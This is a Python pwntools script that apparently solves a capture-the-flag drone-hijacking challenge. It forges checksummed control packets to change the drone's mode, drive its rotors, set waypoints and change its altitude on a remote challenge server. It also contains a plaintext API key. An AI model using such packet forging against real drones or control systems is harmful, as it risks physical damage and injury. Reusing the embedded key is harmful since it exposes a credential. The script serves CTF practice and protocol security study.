from pwn import *
import json
import time
import zlib
import struct

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# p = process('./attackme')

api_key = "ac261681692e300a406552de038cc01df05ef108e21857beac6c1c3dce6498d4"

a = {
  'apikey' : api_key,
}

script = ""

DEBUG = False

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info("Received:" + response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def unsigned32(n):
  return n & 0xFFFFFFFFL

def send_packet(text):
  payload = p32(len(text) + 8)
  payload += text
  payload += p32(unsigned32(zlib.crc32(payload)))

  s(payload.encode('hex'))

def change_mode(uid, mode):
  text = p16(uid)
  text += p16(0xfefe)
  text += p16(mode)

  send_packet(text)

p = remote("hackthedrone.eatpwnnosleep.com", 31234)
p.send(json.dumps(a).encode())

r("\n")
print r("\n")[:-1].decode('hex')

send_packet('ffff')

response = r("\n")[:-1].decode('hex')
# print response

uid = int(response.split(" ")[-1])

"""
0x1212: description
0x3030: current location
0x4040: rotor control
0x6666: change altitude
0x7878: set waypoint
0xfefe: change mode
"""

# Calibrate

change_mode(uid, 2)

for i in range(4):
  response = r("\n")[:-1].decode('hex')
  print response

# rotor control (17~20)

for i in range(17, 21):
  for j in [0, 0xffff]:
    text = p16(uid)
    text += p16(0x4040)
    text += chr(i)
    text += p16(j)

    send_packet(text)

    for k in range(3):
      response = r("\n")[:-1].decode('hex')
      print response

  response = r("\n")[:-1].decode('hex')
  print response

response = r("\n")[:-1].decode('hex')
print response

# change alt

change_mode(uid, 1)

for i in range(3):
  response = r("\n")[:-1].decode('hex')
  print response

text = p16(uid)
text += p16(0x6666)
text += struct.pack('<f', 1000.00)

send_packet(text)

for i in range(3):
  response = r("\n")[:-1].decode('hex')
  print response

time.sleep(6)


# Set waypoint

text = p16(uid)
text += p16(0x7878)
text += struct.pack('<f', 53.00)
text += struct.pack('<f', 45.00)

send_packet(text)

time.sleep(10)

text = p16(uid)
text += p16(0x7878)
text += struct.pack('<f', 53.00)
text += struct.pack('<f', 16.00)

send_packet(text)

time.sleep(11)

text = p16(uid)
text += p16(0x7878)
text += struct.pack('<f', 25.00)
text += struct.pack('<f', 16.00)

send_packet(text)

time.sleep(9)

# Change alt

text = p16(uid)
text += p16(0x6666)
text += struct.pack('<f', 0.00)

send_packet(text)

for i in range(100):
  response = r("\n")[:-1].decode('hex')
  print response

p.interactive()
p.close()
